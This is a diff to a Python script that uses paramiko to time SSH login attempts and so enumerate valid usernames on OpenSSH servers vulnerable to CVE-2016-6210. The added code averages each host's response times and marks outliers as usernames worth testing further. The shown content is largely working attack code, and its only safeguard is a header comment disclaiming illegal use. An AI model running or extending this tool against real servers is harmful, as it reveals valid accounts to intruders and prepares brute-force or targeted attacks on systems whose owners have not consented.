@@ -4,6 +4,10 @@ import paramiko
 import time
 import sys
 
+# Better way to do the average once we can figure out how it works.
+# import numpy as np
+# import pandas as pd
+
 # This script tests OpenSSH servers for the user enumeration bug
 # announced on 18th July 2016, Tentatively numbered CVE 2016-6210
 # Credit for the base script goes to Eddie Harari on the Full Disclosure ML
@@ -13,13 +17,13 @@ import sys
 # As usual, don't do anything stupid/illegal with this.  It's your own damn fault if you do
 
 # TODO add some sort of statistical analysis in order to only print out the significant entries (unless we make current default a verbose mode?)
-# TODO fix output of usernames on targets after the first
+# TODO fix output of usernames on targets after the first.  Done?
 
 
 def main():
     uscount = 0
     ipcount = 0
-    results = []
+    totals = []
     # Username source file.  Acquired from somewhere else
     filename = raw_input("Enter the file you wish to read usernames from: \n")
 
@@ -60,12 +64,14 @@ def main():
                 except:
                     endtime = time.clock()
                     total = endtime - starttime
+                    totals.append(total)
 
                 # placeholder output - final should give only statistically-significant results (ie usernames we care about)
                 print("Time for " + user + "on " + target + ": " + str(total))
 
                 # results array call goes here for later use
                 uscount += 1
+            get_average_response_times(totals)
             uscount = 0 # reset uscount, so we can enter the test again with another IP address
             user_file.seek(0) # reset our place in the users file
             ipcount += 1
@@ -78,4 +84,19 @@ def getlines(filename):
         for i, l in enumerate(f):
             pass
     return i + 1
+
+def get_average_response_times(times):
+
+
+    aggregate = 0.0
+    count = 0
+    avg = 0.0
+    for number in times:
+        aggregate += number
+        count += 1
+    avg = aggregate / count
+    print ("Average (mean) of this host's responses: " + str(avg))
+    print ("Values above " + str((avg * 1.1)) + " or below " + str((avg * 0.9)) + " may be worth testing further!")
+
+
 main()
